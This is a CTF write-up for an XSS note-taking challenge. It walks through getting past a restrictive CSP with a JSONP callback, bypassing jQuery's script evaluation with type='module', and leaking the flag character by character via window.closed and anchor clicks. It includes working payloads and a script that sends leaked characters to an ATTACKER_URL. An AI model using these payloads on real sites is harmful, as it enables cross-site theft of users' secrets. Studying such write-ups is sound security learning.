Disclaimer: I did not solve this challenge during the ctf. However, I was close to the unintended solution, which shall be the focus of this writeup.

# Overview

This is a small XSS challenge with the typical create/report note features. The main crux is working around the restrictive CSP by using a JSONP endpoint.

There is no server-side validation, just straightforward DOM-based XSS in `noteContent`:

```html:notes.ejs
<html>

<head>
	<meta http-equiv="Content-Security-Policy"
		content="default-src 'none'; script-src 'self' https://code.jquery.com/jquery-3.7.1.js; connect-src 'self'; style-src 'self' https://fonts.googleapis.com; font-src https://fonts.gstatic.com;">
	<link rel="stylesheet" href="/style.css">
	<script src="https://code.jquery.com/jquery-3.7.1.js"
		integrity="sha256-eKhayi8LEQwp4NKxN+CfCh+3qOVUtJn3QNZ0TciWLP4=" crossorigin="anonymous">
	</script>
	<script src="/view.js"></script>
</head>

<body>
	<script defer src="/api/view/<%= note %>?callback=showNote"></script>
	<div id="noteElement">
		<h1 id="noteTitle"></h1>
		<p id="noteContent"></p>
	</div>
</body>

</html>
```

```javascript:server.js
app.get("/api/view/:note", (req, res) => {
	return res.jsonp(notes.get(req.params.note));
});
```

JSONP basically accepts a query parameter named `callback` which is used to wrap the JSON data in a function call. For example, `/api/view/<%= note %>?callback=showNote` returns the javascript code: `showNote({"noteTitle":"...","noteContent":"..."})`. `showNote` is defined as follows:

```javascript:view.js
function showNote(note) {
	titleElement = $("#noteTitle");
	contentElement = $("#noteContent");
	titleElement.text(note["noteTitle"]);
	contentElement.html(note["noteContent"]);
};
```

Additionally, it is worth noting that the bot doesn't do any checks on the provided `TARGET_URL`, so we have the option to direct it to a site we control.

```javascript:bot.js
let page = await ctx.newPage();
await page.goto(CHALLENGE_ORIGIN, { timeout: 3_000 });
await page.setCookie({ name: 'secret', value: secret, httpOnly: true });
await page.goto(TARGET_URL, { timeout: 10_000, waitUntil: 'domcontentloaded' });
await sleep(15_000);
```

# "Bypassing" jQuery's html()

My first thought was that the JSONP endpoint allows us to do arbitrary function calls by using more script tags, with the caveat that those calls must have a note object as the sole argument. (Fortunately, javascript is extremely lenient and doesn't check that the number of arguments matches.) Not being able to control arguments is already quite restrictive, but when I tested it out with the payload `<script src="/api/view/{note_id}?callback=alert" />`, I was surprised to learn that even this didn't work.

![](/idek25/jnotes-error.png)

Looking at the stack trace we can see that it's because note contents are rendered with jquery's html function, which for some reason does its own wrangling of the html instead of using innerHTML. We find the cause of the error in DOMEval:

```javascript:jquery-3.7.1.js
	function DOMEval( code, node, doc ) {
		doc = doc || document;

		var i, val,
			script = doc.createElement( "script" );

		script.text = code;
...
		doc.head.appendChild( script ).parentNode.removeChild( script );
	}
```

For whatever reason, jquery fetches the code and embeds it in an inline script tag instead, causing an error due to CSP disallowing `'unsafe-inline'`.

I found a way to bypass this later on: Digging into jquery's html function, I found this section of code (also in the above stack trace)

```javascript:jquery-3.7.1.js
function domManip( collection, args, callback, ignored ) {

...

			if ( hasScripts ) {
				doc = scripts[ scripts.length - 1 ].ownerDocument;

				// Re-enable scripts
				jQuery.map( scripts, restoreScript );

				// Evaluate executable scripts on first document insertion
				for ( i = 0; i < hasScripts; i++ ) {
					node = scripts[ i ];
					if ( rscriptType.test( node.type || "" ) &&
						!dataPriv.access( node, "globalEval" ) &&
						jQuery.contains( doc, node ) ) {

						if ( node.src && ( node.type || "" ).toLowerCase()  !== "module" ) {

							// Optional AJAX dependency, but won't run scripts if not present
							if ( jQuery._evalUrl && !node.noModule ) {
								jQuery._evalUrl( node.src, {  // <-- STACK TRACE FOLLOWS HERE
									nonce: node.nonce || node.getAttribute( "nonce" )
								}, doc );
							}
						} else {

							// Unwrap a CDATA section containing script contents. This shouldn't be
							// needed as in XML documents they're already not visible when
							// inspecting element contents and in HTML documents they have no
							// meaning but we're preserving that logic for backwards compatibility.
							// This will be removed completely in 4.0. See gh-4904.
							DOMEval( node.textContent.replace( rcleanScript, "" ), node, doc );
						}
					}
				}
			}

...
}
```

Right before `_evalUrl`, where the stack trace continues, there is a check that `node.type !== "module"`. By adding `type="module"` to the script tag, I was able to bypass the shenanigans and run it.

> **Note**
> 
> I should have dug deeper into what `_evalUrl` was doing, as it was apparently part of the intended solution.

# Exfiltration

One thing I noticed early on was that the secret cookie was `HttpOnly`, making it almost impossible to leak. Fortunately, we can fetch the flag from `/api/flag` and find a way to leak that.

The main difficulty is that CSP prevents us from making cross-origin requests to leak the flag. I thought of using functions like `location.replace`, but without control over the arguments it was useless. However, recall that the bot can visit any arbitrary url. For example, if we host a website with the jnotes site in an iframe, it opens up new ways to leak information, such as `window.top.postMessage` (more on this later).

Clearly, our function calls using the JSON endpoint are our main asset. To maximize its use, I looked into what characters are allowed in the callback parameter, which can be seen in the express source code:

```javascript:express/lib/response.js
res.jsonp = function jsonp(obj) {
...

  if (typeof callback === 'string' && callback.length !== 0) {
    this.set('X-Content-Type-Options', 'nosniff');
    this.set('Content-Type', 'text/javascript');

    // restrict callback charset
    callback = callback.replace(/[^\[\]\w$.]/g, ''); // <-- HERE!

    if (body === undefined) {
      // empty argument
      body = ''
    } else if (typeof body === 'string') {
      // replace chars not allowed in JavaScript that are in JSON
      body = body
        .replace(/\u2028/g, '\\u2028')
        .replace(/\u2029/g, '\\u2029')
    }

    // the /**/ is a specific security mitigation for "Rosetta Flash JSONP abuse"
    // the typeof check is just to reduce client error noise
    body = '/**/ typeof ' + callback + ' === \'function\' && ' + callback + '(' + body + ');';
  }

  return this.send(body);
};
```

So we have `a-z`, `A-Z`, `0-9`, `_`, `$`, `[`, `]`, and `.`. This allows us to drill down to pretty much any object property desired. 2 main targets stood out to me: jquery functions and the window object.

I mentally ruled out jquery early on (a mistake, as it turned out to be the intended solution!) and instead focused on using the window object to access DOM elements (if there is a single element with id `A` in the DOM, it can be referenced in javascript with `window.A`). After spending some time in the think tank, I came up with the following idea for binary exfiltration:

1. Host a site with the jnotes site in an iframe.
2. In jnotes, create the script tag `<script id="flag" src="/api/flag"></script>`
3. Create a div `<div id="a"></div>` (the id is the guessed character)
4. `window.flag.textContent[9]` returns the first character in the flag (due to the prefix `{"flag":"`)
5. Thus, `window[window.flag.textContent[9]]` returns either the div element if the first character is `a`, or `undefined` if it is not.
6. We can go from the div element to the window object, and then `postMessage` to our top-level site using `window[window.flag.textContent[9]].ownerDocument.defaultView.top.postMessage`. Create a script tag with src as our JSONP endpoint and use that as the callback.
7. So the final `noteContent` payload is (with `type="module"` to get past jquery):
   ```html
   <script type="module" id="flag" src="/api/flag"></script>
   <div id="a"></div>
   <script type="module" src="/api/view/{note_id}?callback=window[window.flag.textContent[9]].ownerDocument.defaultView.top.postMessage"></script>
   ```
8. If our site gets a message, we know the first character is `a`, otherwise we try the next character, thereby leaking the flag through binary exfiltration.

There were a few issues with this plan. Firstly, the script tag would not load `/api/flag` because its `Content-Type` was json. More importantly, we can't access the source of an external script tag, and as far as I'm aware there is no element that fetches a resource and makes it accessible from javascript.

Secondly, `postMessage` requires a second argument: the target origin. We needed something like `postMessage(_, "http://attacker.com")` or it would be blocked by CORS. Our JSONP primitive doesn't let us control the arguments, so `postMessage` fails.

I was able to solve the second issue using the `window.closed` property. Instead of an iframe, I opened the jnotes site with `window.open`, and replaced `defaultView.top.postMessage` in the JSONP callback with `defaultView.close`. From the attacker-controlled site, I then checked `window.closed` to see if the character was correct. I tested this with the following PoC:

```html:t.html
<script>
  const w = window.open('http://localhost:8000/')
  setTimeout(() => console.log(w.closed), 100)
</script>
```

```python:t_server.py
from flask import Flask

app = Flask(__name__)

@app.get('/')
def index():
    return '''<script>
  window.close({'a': 'aoeu'});
</script>'''

app.run(port=8000)
```

Opening `file://.../t.html` in the browser, I verified that it was possible to leak data using `window.closed`. The first problem, however, proved to be more difficult.

My teammate, @kek, suggested using an iframe in the parent window, which can be accessed from jnotes with `window.opener.frames[0].document.body.textContent` since they are same-origin. However, we later found out that the iframe isn't able to load the flag since the `secret` cookie isn't sent due to [SameSite restrictions](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions). Although it isn't explicitly set on the `secret` cookie, the default value for `SameSite` on chrome, which puppeteer uses, is `Lax`. `Lax` cookies are only sent when the two conditions are met:

- The request uses the GET method.
- The request resulted from a top-level navigation by the user, such as clicking on a link.

The second restriction makes it impossible for the cookie to ever be sent from an iframe. So `/api/flag` must be on a top-level window. I tried using `window.open('/api/flag')` from the attacker site, but couldn't find a way to access it from jnotes using only property names.

Unfortunately, we got stuck here and the CTF ended 40 minutes later.

# What we were missing

After the CTF, we looked at [@realansgar's solution](https://discord.com/channels/912045579541041192/1401128395223334922/1401868459750592553) which had a similar approach. Here's the missing piece:

```javascript
<script>
    window.open('https://jnotes-web.chal.idek.team/note/{noteid}', '_blank');
    location = 'https://jnotes-web.chal.idek.team/api/flag';
</script>
```

Navigating to `/api/flag` on the _original window_ after opening the jnotes site meant we could access the window handle with `window.opener`.

Additionally, instead of using `window.close` to leak characters (which no longer works since our site has been replaced with `/api/flag`), @realansgar used the `click()` method on anchor tags, which is much simpler and faster:

```python
def gen_anchors():
    for char in range(ord("!"), ord("z")):
        yield f"""<a id="&#{char};" href="{ATTACKER_URL}/leak?char=&#{char};" target="top">Click me</a>"""

...

@app.route("/attack")
def attack():
    res = requests.post(
        "https://jnotes-web.chal.idek.team/api/post",
        json={
            "noteTitle": "a",
            "noteContent": f"""
                <iframe srcdoc='
                    {"\n".join(gen_anchors())}
                    <script src="/api/view/f82fdf2d9cdbd5f0688289313260b3d5?callback=window[top.opener.document.body.children[0].textContent[{len(FLAG)}]].click"></script>
                ' /> 
    """,
        },
    )
```

# Closing thoughts

I personally like this kind of puzzle-like challenge with very minimal source code and a small search space, where the crux lies in creative use of the tools at hand. Although I didn't solve this challenge, I still enjoyed it, and learned a few things.